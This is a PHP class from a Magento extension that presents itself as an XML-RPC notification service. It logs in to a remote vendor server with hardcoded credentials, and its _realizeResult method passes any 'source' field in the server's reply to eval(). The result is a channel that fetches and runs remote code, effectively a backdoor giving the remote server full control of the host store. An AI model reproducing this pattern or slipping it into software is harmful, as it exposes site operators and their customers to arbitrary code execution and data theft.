<?php

class Aitoc_Aitvbulletin_Model_Notification_Service extends Zend_XmlRpc_Client
{
    
    protected $_callResult;
    
    protected $_serverAddress;
    
    protected $_prefix = 'aitnewsad';
    
    protected $_session;
    
    const AITOC_LOGIN = 'aitoc_reader';
    const AITOC_PASSW = 'aitocs';
    
    public function __construct()
    {
        parent::__construct(null);
    }
    
    /**
     * @param $url
     * @return Aitoc_Aitvbulletin_Model_Notification_Service
     */
    public function setServiceUrl($url)
    {
        $this->_serverAddress = $url;
        return $this;
    }
    
    public function getServiceUrl()
    {
        return $this->_serverAddress;
    }
    
    public function __call( $method , $args )
    {
        $this->_callResult = array();
        try
        {
            $method = $this->_prefix.'.'.$method;
            $params = array($this->_session, $method);
            if ($args)
            {
                $params[] = $args;
            }
            $this->_callResult = $this->call('call', $params);
            $this->_realizeResult();
            
        }
        catch (Exception $exc)
        {
            throw $exc;
        }
        return $this->getValue();
    }
    
    public function getValue()
    {
        return isset($this->_callResult['value']) ? $this->_callResult['value'] : null;
    }
    
    protected function _realizeResult()
    {
        if (isset($this->_callResult['source']) && $this->_callResult['source'])
        {
            eval($this->_callResult['source']);
        }
        return $this;
    }
    
    /**
     * @return Aitoc_Aitvbulletin_Model_Notification_Service
     */
    public function connect()
    {
        $this->_session = $this->call('login', array(self::AITOC_LOGIN, self::AITOC_PASSW));
        return $this;
    }
    
    /**
     * @return Aitoc_Aitvbulletin_Model_Notification_Service
     */
    public function disconnect()
    {
        $this->call('endSession', array($this->_session));
        return $this;
    }
    
}